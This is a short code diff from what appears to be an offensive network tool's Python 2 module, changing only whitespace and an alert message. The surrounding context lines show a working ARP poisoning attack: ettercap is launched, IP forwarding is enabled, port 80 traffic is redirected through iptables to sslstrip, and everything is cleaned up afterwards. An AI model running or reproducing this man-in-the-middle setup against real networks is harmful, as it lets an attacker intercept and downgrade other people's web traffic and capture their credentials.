@@ -40,6 +40,7 @@ def init():
 
 # CODE MODULE    ############################################################################################
 def main(run):
+	
 	if isConect() and checkDevice(init.var['interface']):
 		printAlert(0,"Starting ARP Poisoning [ettercap].")
 		commands.getoutput("iptables --flush -t nat")
@@ -50,7 +51,7 @@ def main(run):
 			commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forward")
 			commands.getoutput("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
 			Subprocess("sslstrip")
-		raw_input(printAlert(8,"to Stop Attack ARP (PRESS ANY KEY)\n"))
+		raw_input(printAlert(8,"to Stop ARP Attack (PRESS ANY KEY)\n"))
 		commands.getoutput("killall ettercap")
 		commands.getoutput("killall sslstrip")
 		commands.getoutput("iptables --flush -t nat")
